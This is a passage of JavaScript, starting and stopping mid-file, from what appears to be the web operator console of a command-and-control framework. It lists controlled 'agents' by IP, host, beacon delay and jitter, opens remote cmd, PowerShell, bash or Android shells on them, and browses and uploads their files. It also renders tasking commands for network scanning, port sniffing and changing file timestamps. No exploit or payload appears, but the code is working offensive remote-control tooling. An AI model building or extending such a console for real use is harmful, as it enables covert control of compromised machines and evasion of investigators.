                cur_dir_p.textContent = "Path:\t" + this.shell_dir;
                this.isMovingFile = false;
            }
        }
        async move_dir(){
            let cur_dir_p = document.getElementById("cur_dir_p");
            let temp_dir = this.shell_dir;
            let directory = document.getElementById("directoryInput").value;
            this.shell_dir = directory;
            let flag = await this.look_file(this.shell_dir);
            if (!flag) {
                this.shell_dir = temp_dir; // 如果 look_file 返回 false，则回退目录
                console.log("!Does not exist or has no permission to access this directory?")
            }
            console.log(this.shell_dir);
            cur_dir_p.textContent="Path:\t"+this.shell_dir;
        }
        get_btn_move(){
            var btn = document.getElementById('dir-btn');
            btn.addEventListener('click', async () => {
                this.move_file(1,'no')
            })
        }

        switchVer(value){
            let cmd = "SWITCH_VERSION*//*"+value;
            webSocketClient.send(
                "msg",
                {
                    uid:this.uid,
                    msg:cmd,
                    Taskid:AgentTaskId
                }
            );
        }
    }
    
    //主页面类
    class lain_index{
        lain_shell(){
            if(!Username){
                return;
            }
            webSocketClient.send(
                
                "agentList",
                {
                    username: Username
                }
            );
        }
        renderUserList(data) {
            let container = document.getElementById('div_index');
            if (!container) {
                return;
            }
            container.innerHTML = "";
            data.forEach(key=>{
                let userDiv = document.createElement('div');
                userDiv.classList.add('ip-info');
                userDiv.id = key.uid + "info";
                let os = (key.os || "").toLowerCase();
                let osEmoji = "💻";
                if(os.includes("linux")){
                    osEmoji="🐧";
                }
                else if(os.includes("macos")){
                    osEmoji="🍏";
                }
                else if(os.includes("android")){
                    osEmoji="🤖";
                }
                let pluginButtons = "";
                let pluginParam = key.plugin_parameter;
                if (pluginParam && typeof pluginParam === 'object' && pluginParam[os]) {
                    for (let codeword in pluginParam[os]) {
                        let paramDescList = pluginParam[os][codeword];
                        let encodedDesc = encodeURIComponent(
                            (Array.isArray(paramDescList) ? paramDescList : []).join(',')
                        );
                        pluginButtons +=
                        '<button type="button" class="console-link" onclick="showPluginDialog(\'' +
                        key['uid'] +
                        '\', \'' +
                        os +
                        '\', \'' +
                        encodedDesc +
                        '\', \'' +
                        codeword +
                        '\')">[' + codeword + ']</button>';
                    }
                }
                let userHTML = '<div class="conn-container">' +
                                '<span class="shell-address">' + key['external_ip'] + '/</span>' +
                                '<span class="ip-address">' + key['host'] + '/</span>' +
                                '<span class="ip-address">' + key['uid'] + '/</span>' +
                                '<span class="ip-address">' + key['protocol'] + '/</span>' +
                                '<span class="ip-address">'+ key['os']  + '/' + osEmoji + '</span>' +
                                '<div class="os-container">' +
                                    '<div class="ip-address" id="' + key['uid'] + '-img" style="background-color: #8B4513; width: 106px; height: 1px; display: inline-block; vertical-align: middle; position: relative;"><div style="position: absolute; top: 0; left: 0; right: 0; bottom: 0; box-shadow: inset 0 0 0 106px #8B4513;"></div></div>' +
                                '</div>' +
                            '</div>' +
                            '<div class="button-container">' +
                                '<button class="console-link" onclick="toggleInfo(\'' + key['uid'] + '\', \'info\')">[info]</button>' +
                                '<button class="console-link" onclick="toggleInfo(\'' + key['uid'] + '\', \'choose\')">[☰]</button>' +
                                '<button class="console-link" onclick="del(\'' + key['uid'] + '\')">🗑️</button>' +
                            '</div>' +
                            '<div class="info-content" id="' + key['uid'] + '-info-content">' +
                                '<p><strong class="s_left">Remarks:</strong><input type="text" value="' + key['remarks'] + '" id="remarks_' + key['uid'] + '" class="s_right_input custom-remarks"></p>' +
                                '<p><strong class="s_left">Path:</strong><strong class="s_right">' + (key['current_dir'] || '-') + '</strong></p>' +
                                '<p><strong class="s_left">Host:</strong><strong class="s_right">' + key['host'] + '</strong></p>' +
                                '<p><strong class="s_left">IP Addresses:</strong><strong class="s_right">' + key['local_ip'] + '</strong></p>' +
                                '<p><strong class="s_left">Check:</strong><strong id="' + key['uid'] + '-check" class="s_right">' + key['check_time'] + '</strong></p>' +
                                '<p><strong class="s_left">Executable:</strong><strong class="s_right">' + key['executable'] + '</strong></p>' +
                                '<p><strong class="s_left">OS:</strong><strong class="s_right">' + key['os'] + '</strong></p>' +
                                '<p><strong class="s_left">Delay:</strong><input type="text" value="' + key['delay'] + '" id="delay_' + key['uid'] + '" class="s_right_input custom-remarks"></p>' +
                                '<p><strong class="s_left">Jitter:</strong><input type="text" value="' + key['jitter'] + '" id="jitter_' + key['uid'] + '" class="s_right_input custom-remarks"></p>' +
                                '<p><strong class="s_left">UID:</strong><strong class="s_right">' + key['uid'] + '</strong></p>' +
                                '<p><strong class="s_left">Server:</strong><strong class="s_right">' + key['server'] + '</strong></p>' +
                                '<p><strong class="s_left">Username:</strong><input type="text" value="' + key['username'] + '" id="username_' + key['uid'] + '" class="s_right_input custom-remarks"></p>' +
                                '<button class="console-link" onclick="saveInfo(\'' + key['uid'] + '\')">Save Changes</button>' +
                            '</div>' +
                            '<div class="choose-content" id="' + key['uid'] + '-choose-content">' +
                                '<button type="button" class="console-link" onclick="showTerminalDialog(\'' + key['uid'] + '\', \'' + key['host'] + '\', \'' + key['os'] + '\')">💻</button>' +
                                '<button type="button" class="console-link file-open-btn" data-uid="' + key['uid'] + '" data-host="' + key['host'] + '" data-dir="' + (key['current_dir'] || './') + '">🗂️</button>' +
                                '<button type="button" class="console-link" onclick="showMsgDialog(\'' + key['uid'] + '\', \'' + key['host'] + '\')">📩</button>' +
                                pluginButtons +
                            '</div>' +
                            '<div class="info-content" id="' + key['uid'] + '-msg-content"></div>';
                            userDiv.innerHTML = userHTML;
                            container.appendChild(userDiv);
            });
        }
        showTerminalDialog(uid, host, os) {
            const dialogId = "terminal-dialog-" + uid;
            let dialog = document.getElementById(dialogId);
            let terminal = null;
            if (dialog) {
                dialog.style.display = "block";
                dialog.style.zIndex = String((window.dialogZIndexCounter = (window.dialogZIndexCounter || 9999) + 1));
                terminal = window.terminalSessions ? window.terminalSessions[uid] : null;
                if (terminal) {
                    window.activeTerminal = terminal;
                    if (terminal.currentInput && terminal.currentInput.isConnected) {
                        terminal.currentInput.focus();
                    }
                }
                return;
            }
            dialog = document.createElement("div");
            dialog.id = dialogId;
            dialog.dataset.uid = uid;
            dialog.style.position = "fixed";
            dialog.style.top = "5%";
            dialog.style.left = "50%";
            dialog.style.transform = "translateX(-50%)";
            dialog.style.background = "linear-gradient(180deg, #fbfdff 0%, #f2f6fb 100%)";
            dialog.style.zIndex = String((window.dialogZIndexCounter = (window.dialogZIndexCounter || 9999) + 1));
            dialog.style.maxWidth = "900px";
            dialog.style.width = "90vw";
            dialog.style.maxHeight = "90vh";
            dialog.style.overflow = "auto";
            dialog.style.border = "1px solid rgba(138, 160, 178, 0.25)";
            dialog.style.borderRadius = "18px";
            dialog.style.boxShadow = "0 24px 60px rgba(44, 72, 98, 0.18)";
            dialog.style.padding = "18px";
            dialog.style.userSelect = "none";
            dialog.style.touchAction = "none";
            dialog.style.backdropFilter = "blur(10px)";
            document.body.appendChild(dialog);

            // 拖动条和内容
            dialog.innerHTML =
                '<div class="terminal-drag-bar" style="position:absolute;top:0;left:0;width:100%;height:36px;cursor:move;background:linear-gradient(90deg, rgba(230,236,243,0.95), rgba(243,247,251,0.9));border-top-left-radius:18px;border-top-right-radius:18px;z-index:10001;border-bottom:1px solid rgba(138,160,178,0.18);"></div>' +
                '<button class="dialog-close-btn terminal-close-btn" type="button">×</button>' +
                '<div class="shell-container" style="margin-top:34px;display:flex;align-items:center;gap:12px;flex-wrap:wrap;padding:8px 4px 14px 4px;">' +
                "<label for='options' style='color:#4f6477;font-size:13px;'>Select Shell:</label>" +
                "<select class='terminal-shell-select' name='options' style='min-width:150px;padding:8px 12px;border-radius:999px;border:1px solid rgba(138,160,178,0.35);background:#fff;color:#314657;'></select>" +
                "<p class='terminal-hostname' style='margin-left:auto;font-size:12px;color:#6a7f92;'>Host: " + host + "</p>" +
                '</div>' +
                '<div class="terminal" style="background:#f8fbff;border-radius:16px;border:1px solid rgba(160,176,194,0.32);padding:16px;min-height:420px;color:#000000;box-shadow:inset 0 1px 0 rgba(255,255,255,0.72);">' +
                '<div class="input-container"></div>' +
                '</div>' +
                '<link rel="stylesheet" href="test.css">';

            // 关闭按钮
            dialog.querySelector(".terminal-close-btn").onclick = function () {
                if (terminal) {
                    terminal.stopAllResultsForUid(uid);
                    if (window.terminalSessions) {
                        delete window.terminalSessions[uid];
                    }
                    if (window.activeTerminal === terminal) {
                        window.activeTerminal = null;
                    }
                }
                dialog.remove();
            };

            // 拖动逻辑（兼容PC和移动端，且窗口不能移出页面）
            const dragBar = dialog.querySelector(".terminal-drag-bar");
            let isDragging = false, offsetX = 0, offsetY = 0, startX = 0, startY = 0;

            function clamp(val, min, max) {
                return Math.max(min, Math.min(val, max));
            }

            function getDialogRect() {
                return dialog.getBoundingClientRect();
            }

            function onMove(e) {
                if (!isDragging) return;
                let clientX = e.touches ? e.touches[0].clientX : e.clientX;
                let clientY = e.touches ? e.touches[0].clientY : e.clientY;
                let newLeft = clientX - offsetX;
                let newTop = clientY - offsetY;
                // 限制窗口不移出页面
                const rect = getDialogRect();
                const winW = window.innerWidth, winH = window.innerHeight;
                const maxLeft = winW - rect.width;
                const maxTop = winH - rect.height;
                newLeft = clamp(newLeft, 0, maxLeft > 0 ? maxLeft : 0);
                newTop = clamp(newTop, 0, maxTop > 0 ? maxTop : 0);
                dialog.style.left = newLeft + "px";
                dialog.style.top = newTop + "px";
                dialog.style.transform = ""; // 拖动后取消居中
            }

            function stopMove() {
                isDragging = false;
                document.body.style.userSelect = "";
                document.removeEventListener("mousemove", onMove);
                document.removeEventListener("mouseup", stopMove);
                document.removeEventListener("touchmove", onMove);
                document.removeEventListener("touchend", stopMove);
            }

            dragBar.addEventListener("mousedown", function(e) {
                isDragging = true;
                const rect = getDialogRect();
                offsetX = e.clientX - rect.left;
                offsetY = e.clientY - rect.top;
                document.body.style.userSelect = "none";
                document.addEventListener("mousemove", onMove);
                document.addEventListener("mouseup", stopMove);
            });
            dragBar.addEventListener("touchstart", function(e) {
                isDragging = true;
                const rect = getDialogRect();
                offsetX = e.touches[0].clientX - rect.left;
                offsetY = e.touches[0].clientY - rect.top;
                document.body.style.userSelect = "none";
                document.addEventListener("touchmove", onMove, {passive: false});
                document.addEventListener("touchend", stopMove);
            });

            setTimeout(() => {
                // 初始化 shell 选项
                const optionsElement = dialog.querySelector(".terminal-shell-select");
                if (os == "win") {
                    optionsElement.innerHTML = "<option>Shell</option><option value='cmd'>cmd</option><option value='powershell'>powershell</option><option value='custom'>customize shell</option>";
                } else if (os == "linux" || os == "macos") {
                    optionsElement.innerHTML = "<option>Shell</option><option value='bash'>bash</option><option value='sh'>sh</option><option value='custom'>customize shell</option>";
                } else if (os == "android") {
                    optionsElement.innerHTML = "<option>Shell</option><option value='/system/bin/bash'>/system/bin/bash</option><option value='/system/bin/sh'>/system/bin/sh</option><option value='custom'>customize shell</option>";
                }

                // 创建 terminal 实例并初始化
                terminal = new lain_terminal();
                terminal.uid = uid;
                terminal.dialogEl = dialog;

                // 让 terminal 内部管理输入框和事件
                terminal.inputContainer = dialog.querySelector(".terminal .input-container");
                terminal.terminalEl = dialog.querySelector(".terminal");
                window.terminalSessions[uid] = terminal;
                window.activeTerminal = terminal;
                terminal.createInput();
                dialog.addEventListener("mousedown", function() {
                    window.activeTerminal = terminal;
                    dialog.style.zIndex = String((window.dialogZIndexCounter = (window.dialogZIndexCounter || 9999) + 1));
                });

                // shell切换
                optionsElement.addEventListener("change", function () {
                    const selectedValue = this.value;
                    if (selectedValue === "custom") {
                        const customEnv = prompt("Enter a shell:");
                        if (customEnv) {
                            const newOption = document.createElement("option");
                            newOption.value = customEnv;
                            newOption.textContent = customEnv;
                            this.insertBefore(newOption, this.querySelector("option[value='custom']"));
                            this.value = customEnv;
                            terminal.switchVer(customEnv);
                        } else {
                            this.value = "Shell";
                        }
                    } else {
                        terminal.switchVer(selectedValue);
                    }
                });
            }, 200);
        }
        showFileDialog(uid, host, dir) {
            // 检查是否已存在弹窗
            let dialog = document.getElementById("file-dialog");
            if (!dialog) {
                dialog = document.createElement("div");
                dialog.id = "file-dialog";
                dialog.style.position = "fixed";
                dialog.style.top = "5%";
                dialog.style.left = "50%";
                dialog.style.transform = "translateX(-50%)";
                dialog.style.background = "#fff";
                dialog.style.zIndex = 9999;
                dialog.style.maxWidth = "1100px";
                dialog.style.width = "95vw";
                dialog.style.height = "85%";
                dialog.style.overflow = "hidden";
                dialog.style.border = "1px solid #ccc";
                dialog.style.borderRadius = "8px";
                dialog.style.boxShadow = "0 2px 8px rgba(0,0,0,0.2)";
                dialog.style.userSelect = "none";
                dialog.style.touchAction = "none";
                document.body.appendChild(dialog);
            } else {
                dialog.innerHTML = "";
            }

            // 拖动条和内容
            dialog.innerHTML =
                '<div id="file-drag-bar" style="position:absolute;top:0;left:0;width:100%;height:32px;cursor:move;background:rgba(0,0,0,0.05);border-top-left-radius:8px;border-top-right-radius:8px;z-index:10001;"></div>' +
                '<button id="file-close-btn" class="dialog-close-btn" type="button">×</button>' +
                '<div style="display:flex;width:100%;margin-top:32px;position:relative;height:calc(90vh - 48px);overflow:hidden;">' +
                    '<div id="history" class="file-history" style="width:200px;min-width:80px;max-width:80vw;transition:width 0.1s;"></div>' +
                    '<div id="file-history-resizer" style="min-width:6px;cursor:col-resize;background:#e0e0e0;z-index:10;"></div>' +
                    '<div class="filecontainer">' +
                        '<div>' +
                            '<div style="display: flex; align-items: center;">' +
                                "<p id='hostname' style='margin-right: 25px;'>Host:" + host + "</p>" +
                                '<label for="splitSize">Enter the split size (each part in MB): </label>' +
                                '<input type="number" id="splitSize" min="1" placeholder="Enter part" />' +
                            '</div>' +
                        '</div>' +
                        '<div id="file_resp" class="file-manager"></div>' +
                        '<form id="uploadForm">' +
                            '<input type="file" id="uploadFile" name="uploadFile" required>' +
                            '<input class="fileinput" type="submit" value="Upload">' +
                        '</form>' +
                        '<div class="dir-btn" id="dir-btn">&#x21B6; ../</div>' +
                        '<div class="dir-controls">' +
                            '<p id="cur_dir_p"></p>' +
                            '<input type="text" id="directoryInput">' +
                            '<button id="moveDirButton" type="button">Goto folder</button>' +
                        '</div>' +
                    '</div>' +
                '</div>' +
                '<link rel="stylesheet" href="test.css">';

            // 关闭按钮
            dialog.querySelector("#file-close-btn").onclick = function () {
                dialog.remove();
            };

            // 拖动逻辑（兼容PC和移动端，且窗口不能移出页面）
            const dragBar = dialog.querySelector("#file-drag-bar");
            let isDragging = false, offsetX = 0, offsetY = 0;

            function clamp(val, min, max) {
                return Math.max(min, Math.min(val, max));
            }

            function getDialogRect() {
                return dialog.getBoundingClientRect();
            }

            function onMove(e) {
                if (!isDragging) return;
                let clientX = e.touches ? e.touches[0].clientX : e.clientX;
                let clientY = e.touches ? e.touches[0].clientY : e.clientY;
                let newLeft = clientX - offsetX;
                let newTop = clientY - offsetY;
                // 限制窗口不移出页面
                const rect = getDialogRect();
                const winW = window.innerWidth, winH = window.innerHeight;
                const maxLeft = winW - rect.width;
                const maxTop = winH - rect.height;
                newLeft = clamp(newLeft, 0, maxLeft > 0 ? maxLeft : 0);
                newTop = clamp(newTop, 0, maxTop > 0 ? maxTop : 0);
                dialog.style.left = newLeft + "px";
                dialog.style.top = newTop + "px";
                dialog.style.transform = ""; // 拖动后取消居中
            }

            function stopMove() {
                isDragging = false;
                document.body.style.userSelect = "";
                document.removeEventListener("mousemove", onMove);
                document.removeEventListener("mouseup", stopMove);
                document.removeEventListener("touchmove", onMove);
                document.removeEventListener("touchend", stopMove);
            }

            dragBar.addEventListener("mousedown", function(e) {
                isDragging = true;
                const rect = getDialogRect();
                offsetX = e.clientX - rect.left;
                offsetY = e.clientY - rect.top;
                document.body.style.userSelect = "none";
                document.addEventListener("mousemove", onMove);
                document.addEventListener("mouseup", stopMove);
            });
            dragBar.addEventListener("touchstart", function(e) {
                isDragging = true;
                const rect = getDialogRect();
                offsetX = e.touches[0].clientX - rect.left;
                offsetY = e.touches[0].clientY - rect.top;
                document.body.style.userSelect = "none";
                document.addEventListener("touchmove", onMove, {passive: false});
                document.addEventListener("touchend", stopMove);
            });

            // 样式（内容后 append，避免被 innerHTML 覆盖）
            const style = document.createElement("style");
            style.textContent =
                ".dir-btn{margin:10px 0;cursor:pointer;color:#007bff;}" +
                ".dir-controls{margin:10px 0;display:flex;align-items:center;gap:8px;}" +
                ".fileinput{margin-left:8px;}" +
                ".directory,.file{padding:6px 0;border-bottom:1px solid #eee;display:flex;align-items:center;gap:8px;}" +
                ".icon-dir,.icon-file{margin-right:4px;}" +
                ".file-history{overflow:auto;background:#fafafa;border-right:1px solid #eee;}" +
                ".filecontainer{background:#fff;}" +
                ".file-manager{min-width:80px;}";
            dialog.appendChild(style);

            // 拖动改变 file-history 和 filecontainer 宽度（联动 file-manager）
            setTimeout(function () {
                const resizer = document.getElementById('file-history-resizer');
                const history = document.getElementById('history');
                const filecontainer = dialog.querySelector('.filecontainer');
                const parent = resizer.parentElement;
                let resizing = false, startX = 0, startWidth = 0, parentWidth = 0, resizerWidth = 0;

                resizer.addEventListener('mousedown', function(e) {
                    resizing = true;
                    startX = e.clientX;
                    startWidth = history.offsetWidth;
                    parentWidth = parent.offsetWidth;
                    resizerWidth = resizer.offsetWidth;
                    document.body.style.cursor = 'col-resize';
                    document.addEventListener('mousemove', resize);
                    document.addEventListener('mouseup', stopResize);
                });

                function resize(e) {
                    if (!resizing) return;
                    let newWidth = startWidth + (e.clientX - startX);
                    // 限制最小最大宽度
                    newWidth = Math.max(80, Math.min(newWidth, parentWidth - 80 - resizerWidth));
                    history.style.width = newWidth + 'px';
                    filecontainer.style.width = (parentWidth - newWidth - resizerWidth) + 'px';
                    filecontainer.style.flex = 'none';
                }

                function stopResize() {
                    resizing = false;
                    document.body.style.cursor = '';
                    document.removeEventListener('mousemove', resize);
                    document.removeEventListener('mouseup', stopResize);
                }
            }, 200);

            // 逻辑
            setTimeout(function () {
                const fliemanage = new lain_terminal();
                fliemanage.uid = uid;
                window.activeFileManager = fliemanage;
                
                let hostname = document.getElementById("hostname");
                hostname.innerText = "Host:" + host;

                // 上传表单
                document.getElementById("uploadForm").addEventListener("submit",
                async function(event){
                    event.preventDefault();
                    const fileInput = document.getElementById("uploadFile");
                    const file = fileInput.files[0];
                    if(!file){
                        customAlert("Please select a file");
                        return;
                    }
                    const splitSizeInput = document.getElementById("splitSize");
                    const splitSize = splitSizeInput.value ? parseFloat(splitSizeInput.value) * 1024 * 1024 : 0;
                    const file_name = fliemanage.shell_dir + "/" + file.name;
                    try{
                        await webSocketClient.sendFile(
                            "uploadFile",
                            {
                                uid:fliemanage.uid,
                                filename:file_name,
                                splitSize:String(splitSize)
                            },
                            file,
                            32 * 1024
                        );
                        console.log(file_name,"File uploaded successfully");
                        fliemanage.loadFile(
                            file_name,
                            file.size
                        );
                    }catch(err){
                        console.error(
                            "upload error:",
                            err
                        );
                        customLog("Upload failed");
                    }
                });

                // 返回上级目录
                document.getElementById("dir-btn").onclick = function() {
                    fliemanage.move_file(1, "no");
                };

                // 跳转目录
                document.getElementById("moveDirButton").onclick = function() {
                    fliemanage.move_dir();
                };

                // 初始化
                fliemanage.shell_dir = dir || "./";
                fliemanage.history_file(uid);
                fliemanage.look_file(fliemanage.shell_dir);

            }, 200);
        }
        showMsgDialog(uid, host) {
            // 检查是否已存在弹窗
            let dialog = document.getElementById("msg-dialog");
            if (!dialog) {
                dialog = document.createElement("div");
                dialog.id = "msg-dialog";
                dialog.style.position = "fixed";
                dialog.style.top = "10%";
                dialog.style.left = "50%";
                dialog.style.transform = "translateX(-50%)";
                dialog.style.background = "#fff";
                dialog.style.zIndex = 9999;
                dialog.style.maxWidth = "700px";
                dialog.style.width = "90vw";
                dialog.style.maxHeight = "90vh";
                dialog.style.overflow = "auto";
                dialog.style.border = "1px solid #ccc";
                dialog.style.borderRadius = "8px";
                dialog.style.boxShadow = "0 2px 8px rgba(0,0,0,0.2)";
                dialog.style.padding = "16px";
                dialog.style.userSelect = "none";
                dialog.style.touchAction = "none";
                document.body.appendChild(dialog);
            } else {
                dialog.innerHTML = "";
            }

            // 拖动条和内容
            dialog.innerHTML =
                '<div id="msg-drag-bar" style="position:absolute;top:0;left:0;width:100%;height:32px;cursor:move;background:rgba(0,0,0,0.05);border-top-left-radius:8px;border-top-right-radius:8px;z-index:10001;"></div>' +
                '<button id="msg-close-btn" class="dialog-close-btn" type="button">×</button>' +
                '<div style="display: flex; align-items: center; margin-top:32px;">' +
                    '<h2>Msg list</h2>' +
                    "<p id='hostname' style='margin-left: 25px;'>Host:" + host + "</p>" +
                '</div>' +
                '<div id="msg-container">loading...</div>';

            // 拖动逻辑（兼容PC和移动端，且窗口不能移出页面）
            const dragBar = dialog.querySelector("#msg-drag-bar");
            let isDragging = false, offsetX = 0, offsetY = 0;

            function clamp(val, min, max) {
                return Math.max(min, Math.min(val, max));
            }

            function getDialogRect() {
                return dialog.getBoundingClientRect();
            }

            function onMove(e) {
                if (!isDragging) return;
                let clientX = e.touches ? e.touches[0].clientX : e.clientX;
                let clientY = e.touches ? e.touches[0].clientY : e.clientY;
                let newLeft = clientX - offsetX;
                let newTop = clientY - offsetY;
                // 限制窗口不移出页面
                const rect = getDialogRect();
                const winW = window.innerWidth, winH = window.innerHeight;
                const maxLeft = winW - rect.width;
                const maxTop = winH - rect.height;
                newLeft = clamp(newLeft, 0, maxLeft > 0 ? maxLeft : 0);
                newTop = clamp(newTop, 0, maxTop > 0 ? maxTop : 0);
                dialog.style.left = newLeft + "px";
                dialog.style.top = newTop + "px";
                dialog.style.transform = ""; // 拖动后取消居中
            }

            function stopMove() {
                isDragging = false;
                document.body.style.userSelect = "";
                document.removeEventListener("mousemove", onMove);
                document.removeEventListener("mouseup", stopMove);
                document.removeEventListener("touchmove", onMove);
                document.removeEventListener("touchend", stopMove);
            }

            dragBar.addEventListener("mousedown", function(e) {
                isDragging = true;
                const rect = getDialogRect();
                offsetX = e.clientX - rect.left;
                offsetY = e.clientY - rect.top;
                document.body.style.userSelect = "none";
                document.addEventListener("mousemove", onMove);
                document.addEventListener("mouseup", stopMove);
            });
            dragBar.addEventListener("touchstart", function(e) {
                isDragging = true;
                const rect = getDialogRect();
                offsetX = e.touches[0].clientX - rect.left;
                offsetY = e.touches[0].clientY - rect.top;
                document.body.style.userSelect = "none";
                document.addEventListener("touchmove", onMove, {passive: false});
                document.addEventListener("touchend", stopMove);
            });

            // 关闭按钮
            dialog.querySelector("#msg-close-btn").onclick = function () {
                dialog.remove();
            };

            // 样式（内容后 append，避免被 innerHTML 覆盖）
            const style = document.createElement("style");
            style.textContent =
                ".msg-item {background: white; border: 1px solid #ccc; padding: 10px; margin-bottom: 8px; position: relative;}" +
                ".btn-group {position: absolute; right: 10px; top: 10px;}" +
                ".move-btn, .del-btn {margin-left: 5px; padding: 4px 6px; font-size: 14px;}" +
                ".msg-item span {user-select: none;}" +
                ".msg-item span[title] {color: blue; text-decoration: underline dotted;}" +
                ".msg-item-dragging {opacity: 0.92; box-shadow: 0 14px 32px rgba(0,0,0,0.14); z-index: 10020;}" +
                ".msg-drag-handle {margin-right: 6px; padding: 2px 6px; border: 1px solid #d7dde5; background: #f7f9fc; border-radius: 8px; cursor: grab; touch-action: none; color: #6b7b8b;}" +
                ".msg-drag-handle:active {cursor: grabbing;}" +
                ".msg-drop-placeholder {border: 1px dashed #9eb3c7; border-radius: 10px; margin-bottom: 8px; background: rgba(228,236,245,0.45);}";
            dialog.appendChild(style);

            // 逻辑
            setTimeout(function() {
                
                const msgContainer = dialog.querySelector("#msg-container");
                let msgPostArray = [];
                let activeMessageDrag = null;

                async function loadMessages(){
                    try{
                        msgContainer.innerHTML="";
                        const requestList = document.createElement("div");
                        requestList.id = "msg-request-list";
                        msgContainer.appendChild(requestList);
                        const listData = Array.isArray(msgQueues[uid]) ?
                            msgQueues[uid] :
                            [];
                        listData.forEach((raw,i)=>{
                            const text =
                                renderMsgText(raw);
                            requestList.appendChild(
                                createMessageItem({
                                    text:text,
                                    index:i,
                                    rawMessage:raw,
                                    sourceIndex:i,
                                    withMove:true,
                                    onDelete:div=>deleteMsg(div)
                                })
                            );
                        });
                        const postData = Array.isArray(resultQueues[uid]) ?
                            resultQueues[uid] :
                            [];
                        if(postData.length===0){
                            return;
                        }
                        msgPostArray = postData.slice();
                        let h2=document.createElement("h2");
                        h2.textContent="result List";
                        msgContainer.appendChild(h2);
                        postData.forEach(raw=>{
                            const div=createMessageItem({
                                text:raw,
                                expandable:true,
                                withCopy:true,
                                onDelete:async div=>{
                                    let realIndex =
                                        msgPostArray.indexOf(raw);
                                    if(realIndex!==-1){
                                        msgPostArray.splice(
                                            realIndex,
                                            1
                                        );
                                    }
                                    await webSocketClient.send(
                                        
                                        "delMsgMap",
                                        {
                                            uid:uid,
                                            index:String(realIndex)
                                        }
                                    );
                                    div.remove();
                                    customLog("Result deleted");
                                }
                            });
                            msgContainer.appendChild(div);
                        });
                    }catch(err){
                        console.error(
                            "load messages error:",
                            err
                        );
                    }
                }
                loadMessages();
                let msgTimer=setInterval(
                    loadMessages,
                    10000
                );
                function renderMsgText(rawMsg) {
				    let taskId = "";
				    let msgContent = rawMsg;
				    // 提取 taskid
				    const colonIndex = rawMsg.indexOf(":");
				    if (colonIndex >= 0) {
				        taskId = rawMsg.substring(0, colonIndex).trim();
				        msgContent = rawMsg.substring(colonIndex + 1).trim();
				    }
				    const parts = msgContent.split("*//*");
				    let result;
				    switch (parts[0]) {
				        case "GET_U_FRIENDS":
				            result = "scan: " + parts[1] + 
				                     "   range: " + parts[2] + 
				                     "   delay: " + parts[3];
				            break;
				        case "GET_DELAY":
				            result = "change delay: " + parts[1] + " seconds";
				            break;
				        case "GET_U_FILE":
				            result = "File: " + parts[1] + 
				                     "   Size: " + parts[2] + " bytes";
				            break;
				        case "LOAD_U_FILE":
				            result = "File: " + parts[1];
				            break;
				
				        case "LOOK_UP_FILE":
				            result = "lookDir: " + parts[1];
				            break;
				        case "GET_PORTS":
				            result = "sniff: " + parts[1] + 
				                     "   range: " + parts[2] + 
				                     "   delay: " + parts[3];
				            break;
				        case "SWITCH_VERSION":
				            result = "change shell: " + parts[1];
				            break;
				        case "CHANG_FILE_NAME":
				            result = "change file name: " + parts[1] + " -> " + parts[2];
				            break;
				        case "CHANG_FILE_TIME":
				            result = "change file time: " + parts[1] + " -> " + parts[2];
				            break;
				        case "GET_JITTER":
				            result = "change jitter: " + parts[1];
				            break;
				        default:
				            result = msgContent;
				    }
				
				    // 统一在这里拼回 taskid
				    return taskId ? result + "   taskid: " + taskId : result;
				}
                function createMessageItem({
                    text,
                    index = null,
                    rawMessage = "",
                    sourceIndex = null,
                    expandable = false,
                    onDelete = null,
                    withMove = false,
                    withCopy = false
                }) {
                    const msgDiv = document.createElement("div");
                    msgDiv.className = "msg-item";
                    if (withMove) {
                        msgDiv.dataset.reorderable = "true";
                    }
                    if (rawMessage !== null && rawMessage !== undefined) {
                        msgDiv.dataset.rawMessage = rawMessage;
                    }
                    if (sourceIndex !== null && sourceIndex !== undefined) {
                        msgDiv.dataset.sourceIndex = String(sourceIndex);
                    }
                    msgDiv.style.display = "flex";
                    msgDiv.style.justifyContent = "space-between";
                    msgDiv.style.alignItems = "center";
                    msgDiv.style.gap = "8px";
                
                    const left = document.createElement("div");
                    left.style.display = "flex";
                    left.style.alignItems = "center";
                    left.style.gap = "8px";
                    left.style.flex = "1";
                
                    if (withMove) {
                        const handle = document.createElement("button");
                        handle.type = "button";
                        handle.className = "msg-drag-handle";
                        handle.textContent = "⋮⋮";
                        handle.title = "Drag to reorder";
                        handle.addEventListener("pointerdown", function(event) {
                            startMessageDrag(msgDiv, handle, event);
                        });
                        left.appendChild(handle);
                    }
                
                    if (index !== null) {
                        const idx = document.createElement("span");
                        idx.className = "msg-index";
                        idx.textContent = "[" + String(index).padStart(2, "0") + "] ";
                        left.appendChild(idx);
                    }
                
                    const span = document.createElement("span");
                    let expanded = false;
                
                    if (expandable && text.length > 10) {
                        const shortText = text.slice(0, 10) + "…";
                        span.textContent = shortText;
                        span.style.cursor = "pointer";
                        span.onclick = () => {
                            expanded = !expanded;
                            span.textContent = expanded ? text : shortText;
                        };
                    } else {
                        span.textContent = text;
                    }
                
                    left.appendChild(span);
                    msgDiv.appendChild(left);
                
                    const btnGroup = document.createElement("div");
                    btnGroup.style.display = "flex";
                    btnGroup.style.gap = "4px";
                
                    if (withCopy) {
                        const copy = document.createElement("button");
                        copy.textContent = "📋";
                        copy.onclick = () => {
                            navigator.clipboard.writeText(text).then(() => {
                                copy.textContent = "✔";
                                setTimeout(() => copy.textContent = "📋", 1000);
                            });
                        };
                        btnGroup.appendChild(copy);
                    }
                
                    if (onDelete) {
                        const del = document.createElement("button");
                        del.textContent = "🗑";
                        del.onclick = () => onDelete(msgDiv);
                        btnGroup.appendChild(del);
                    }
                
                    msgDiv.appendChild(btnGroup);
                    return msgDiv;
                }

                function getRequestList() {
                    return dialog.querySelector("#msg-request-list");
                }

                function getReorderItems() {
                    const requestList = getRequestList();
                    if (!requestList) {
                        return [];
                    }
                    return Array.from(
                        requestList.querySelectorAll('.msg-item[data-reorderable="true"]')
                    );
                }

                function refreshMessageIndexes() {
                    getReorderItems().forEach(function(item, index) {
                        const idx = item.querySelector(".msg-index");
                        if (idx) {
                            idx.textContent = "[" + String(index).padStart(2, "0") + "] ";
                        }
                        item.dataset.sourceIndex = String(index);
                    });
                    msgQueues[uid] = getReorderItems().map(function(item) {
                        return item.dataset.rawMessage || "";
                    });
                }

                function startMessageDrag(msgDiv, handle, event) {
                    const requestList = getRequestList();
                    const items = getReorderItems();
                    if (!requestList || items.length <= 1 || activeMessageDrag) {
                        return;
                    }
                    event.preventDefault();
                    event.stopPropagation();

                    const rect = msgDiv.getBoundingClientRect();
                    const placeholder = document.createElement("div");
